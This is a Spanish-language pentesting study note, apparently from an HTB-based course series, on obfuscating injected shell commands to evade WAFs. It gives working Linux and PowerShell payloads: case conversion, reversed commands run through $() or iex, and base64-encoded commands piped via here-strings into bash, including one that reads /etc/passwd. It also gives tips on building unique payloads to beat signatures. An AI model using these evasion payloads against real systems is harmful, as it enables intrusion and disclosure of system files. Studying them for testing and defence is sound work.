---
tags:
  - Web/Red-Team
  - Pentesting/Explotacion
  - Command-Injection
Descripción: "Frente a un WAF, las inserciones de la nota anterior (comillas, backslashes) ya no bastan: el WAF no busca la palabra exacta, busca patrones, y w'h'o'am'i es uno que reconoce"
Fecha de actualización: 2026-06-13
Nota previa: "[[06 - Bypass de comandos en blacklist]]"
Nota siguiente: "[[08 - Herramientas de evasión y ofuscación]]"
Area: "[[Command Injection.base|Command Injection]]"
---
---

Frente a un `WAF`, las inserciones de la nota anterior (comillas, backslashes) ya no bastan: el WAF no busca la palabra exacta, busca **patrones**, y `w'h'o'am'i` es uno que reconoce. La ofuscación avanzada da un paso más: <mark style="background: #ADCCFFA6;">transforma el comando en algo que no se parece a un comando, y lo reconstruye en tiempo de ejecución dentro de una sub-shell</mark>. El comando nunca aparece en claro en la petición, así que no hay firma que detectar.

# Manipulación de mayúsculas/minúsculas

## Windows (trivial)

`cmd` y `PowerShell` son **case-insensitive**: ejecutan el comando escrito en cualquier caja. Basta alternar mayúsculas para romper una blacklist:

```powershell-session
PS C:\htb> WhOaMi
21y4d
```

## Linux (requiere conversión)

`bash` es **case-sensitive**, así que `WhOaMi` no existe como comando. Hay que normalizarlo a minúsculas en ejecución. `tr` dentro de una sub-shell lo hace:

```shell-session
$ $(tr "[A-Z]" "[a-z]"<<<"WhOaMi")
21y4d
```

Una alternativa solo-bash, sin binario externo, usando expansión de parámetros (`,,` pasa a minúsculas):

```bash
$(a="WhOaMi";printf %s "${a,,}")
```

> [!warning]+ Cuida los caracteres filtrados dentro de la ofuscación
> Esto es lo que más confunde al principiante. <mark style="background: #FFB8EBA6;">La técnica de ofuscación puede introducir caracteres que el filtro bloquea</mark> —el `tr "[A-Z]"...` lleva espacios—. Si el payload falla, no es que la técnica no sirva: es que coló un carácter vetado. Sustituye los espacios por tabs (`%09`) o `${IFS}` y vuelve a probar. Cada técnica de evasión se **compone** con las anteriores.

# Comandos invertidos

Escribir el comando al revés evita por completo que la palabra prohibida aparezca, y se revierte en ejecución. Primero se obtiene la cadena invertida:

```shell-session
$ echo 'whoami' | rev
imaohw
```

Y se ejecuta revirtiéndola en una sub-shell `$()`:

```shell-session
$ $(rev<<<'imaohw')
21y4d
```

El mismo patrón en Windows con `PowerShell`, que invierte tratando la cadena como array y ejecuta con `iex` (`Invoke-Expression`):

```powershell-session
PS C:\htb> iex "$('imaohw'[-1..-20] -join '')"
21y4d
```

<mark style="background: #FFB8EBA6;">Si el comando original contenía caracteres filtrados, hay que invertirlos también</mark> (o incluirlos al generar la cadena invertida), o reaparecerán en claro.

# Comandos codificados

La técnica más potente, y la que de verdad evade WAFs: codificar el payload completo —incluidos los caracteres filtrados— en `base64` o hex, y decodificarlo + ejecutarlo en una sub-shell. Como la cadena codificada es alfanumérica, no contiene ninguno de los caracteres problemáticos.

En Linux, codificamos un payload que incluye `/`, espacios y un pipe:

```shell-session
$ echo -n 'cat /etc/passwd | grep 33' | base64
Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==
```

Y lo ejecutamos decodificándolo hacia `bash`:

```shell-session
$ bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
```

> [!important]+ `<<<` en lugar de pipe
> Fíjate en el uso de `<<<` (*here-string*) en vez de `|`. <mark style="background: #FF5582A6;">El pipe suele estar filtrado</mark> (es operador de inyección), así que alimentamos la sub-shell con un here-string. Si `base64` o `bash` también estuvieran vetados, se sustituyen por `openssl` (decodifica b64), `xxd` (hex) o `sh`, o se ofuscan con la [[06 - Bypass de comandos en blacklist|inserción de caracteres]] de la nota anterior.

En Windows, `PowerShell` codifica en `base64` pero exige `UTF-16LE` (`Unicode`):

```powershell-session
PS C:\htb> [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))
dwBoAG8AYQBtAGkA
```

```powershell-session
PS C:\htb> iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"
21y4d
```

Desde Linux puede prepararse el b64 compatible con Windows convirtiendo a `UTF-16LE` antes de codificar:

```shell-session
$ echo -n whoami | iconv -f utf-8 -t utf-16le | base64
dwBoAG8AYQBtAGkA
```

# La clave estratégica: comandos únicos

<mark style="background: #FFB86CA6;">El verdadero valor de la ofuscación avanzada es que puedes inventar variantes nunca vistas</mark>. Un WAF se defiende con firmas de payloads conocidos; si copias un one-liner de una hoja de trucos popular, es probable que ya esté en su base de datos. Componiendo tus propias capas —case + reverse + encoding + sustitución de separadores— produces un payload único para ese objetivo, con muchas más probabilidades de pasar. Es exactamente lo que automatizan las [[08 - Herramientas de evasión y ofuscación|herramientas de la siguiente nota]].

> [!warning]+ Gotcha moderno: la ofuscación que evade el WAF dispara el EDR
> Cuidado con un efecto colateral que HTB (de hace años) no menciona y que hoy importa mucho en bug bounty y red team: <mark style="background: #FF5582A6;">`base64 -d | bash`, `bash<<<$(...)` y sobre todo `powershell -enc` son patrones que los EDR y los SIEM modernos vigilan de cerca</mark>. Puedes saltarte el WAF de la capa web y, al mismo tiempo, generar una alerta de alta prioridad en el SOC por "comando codificado sospechoso". En un engagement con `OPSEC`, valora el ruido: a veces una inserción simple es más sigilosa que un `base64` que enciende todas las luces. Documenta esta tensión en el informe.

| Técnica | Linux | Windows |
| - | - | - |
| Case | `$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")` | `WhOaMi` (directo) |
| Reverse | `$(rev<<<'imaohw')` | `iex "$('imaohw'[-1..-20] -join '')"` |
| Encoding | `bash<<<$(base64 -d<<<...)` | `iex "$(...FromBase64String('...'))"` |

> [!info]+ Fuentes
> - [PayloadsAllTheThings — Command Injection (obfuscation)](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Command%20Injection/README.md) — wildcards, regex, integer expansion y más.
> - [GTFOBins](https://gtfobins.github.io/) — binarios alternativos (`openssl`, `xxd`, `sh`) cuando el habitual está filtrado.
> - [HackTricks — Bypass Linux shell restrictions](https://book.hacktricks.xyz/linux-hardening/bypass-bash-restrictions) — referencia viva de combinaciones.

Hacer todo esto a mano es lento y propenso a error. El siguiente paso es automatizar la ofuscación con herramientas dedicadas: [[08 - Herramientas de evasión y ofuscación]].
